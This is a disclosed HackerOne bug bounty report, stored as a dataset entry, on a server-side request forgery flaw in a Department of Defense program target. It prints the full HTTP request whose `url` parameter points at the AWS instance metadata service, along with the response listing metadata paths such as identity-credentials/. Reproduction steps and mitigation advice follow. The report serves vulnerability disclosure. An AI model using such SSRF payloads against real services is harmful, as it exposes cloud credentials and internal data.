---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1623685'
original_report_id: '1623685'
title: SSRF ACCESS AWS METADATA - █████
weakness: Server-Side Request Forgery (SSRF)
team_handle: deptofdefense
created_at: '2022-07-04T05:59:09.308Z'
disclosed_at: '2022-09-14T20:35:27.718Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF ACCESS AWS METADATA - █████

## Metadata

- HackerOne Report ID: 1623685
- Weakness: Server-Side Request Forgery (SSRF)
- Program: deptofdefense
- Disclosed At: 2022-09-14T20:35:27.718Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Security Team,
Based on https://hackerone.com/hack-us-h1c challenge, I have urgent vulnerability and the challenge doesn't accept reprots for now 1:56 AM 
.
I have found a SSRF Vulnerability which allow access to the AWS metadata, using Parameter `?url=` as shown blew
An attacker can tunnel into internal networks and access sensitive internal data such as AWS meta data information.

.
**Http Request**
```http
GET /api/v1/download-url?url=http://█████/latest/meta-data/ HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Access-Control-Allow-Origin: *
Referer: https://████/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close


```
.
**Http Response**
```http
HTTP/1.1 200 OK
Server: nginx/1.21.6
Date: Mon, 04 Jul 2022 05:42:12 GMT
Content-Type: text/plain
Connection: close
Strict-Transport-Security: max-age=31536000; includeSubdomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Content-Security-Policy: object-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' 'strict-dynamic' https: http:;
Front-End-Https: on
Content-Length: 313

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```
.
.
**SCREEN SHOT**
████
.
.

## Impact

SSRF Vulnerability 
Remote Access to AWS metadata

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1 - Visit https://██████████
2 - Press 'Import from URL' Button & Enter SSRF Payload in the Dialog Box
3 - Intercept the Request & observe the response

## Suggested Mitigation/Remediation Actions
Sanitize user supplied input in paramter `?url=`
Block access to internal networks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
